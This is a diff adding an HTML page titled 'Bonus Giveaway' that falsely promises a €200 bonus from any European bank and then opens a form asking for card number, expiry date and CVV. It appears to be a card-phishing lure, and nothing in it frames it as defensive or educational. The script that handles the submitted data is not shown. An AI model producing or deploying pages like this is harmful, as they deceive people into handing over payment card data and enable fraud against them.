@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bonus Giveaway</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Контейнер с контентом -->
+  <div class="content">
+    <div class="text-container">
+      <h1>Get a €200 bonus for everyone right now on any European bank.</h1>
+      <p class="bonus-description">Don't miss out on this great opportunity to receive your bonus instantly.</p>
+      <button id="get-now-btn">GET NOW!</button>
+    </div>
+    <div class="images-container">
+      <img src="bank1.png" id="bank-image" alt="Bank">
+    </div>
+  </div>
+
+  <!-- Модальное окно для ввода данных карты -->
+  <div id="card-modal" class="modal">
+    <div class="modal-content">
+      <span id="close-btn" class="close">&times;</span>
+      <h2>Enter your card details</h2>
+      <form id="card-form">
+        <label for="card-number">Card Number</label>
+        <div class="input-container">
+          <input type="text" id="card-number" name="card-number" required maxlength="19" data-icon="card-number">
+        </div>
+
+        <label for="expiry-date">Expiry Date (MM/YY)</label>
+        <div class="input-container">
+          <input type="text" id="expiry-date" name="expiry-date" required maxlength="5" placeholder="MM/YY" data-icon="expiry-date">
+        </div>
+
+        <label for="cvv">CVV</label>
+        <div class="input-container">
+          <input type="password" id="cvv" name="cvv" required maxlength="3" data-icon="cvv">
+          <button type="button" id="show-cvv" class="show-btn">Show</button>
+        </div>
+
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
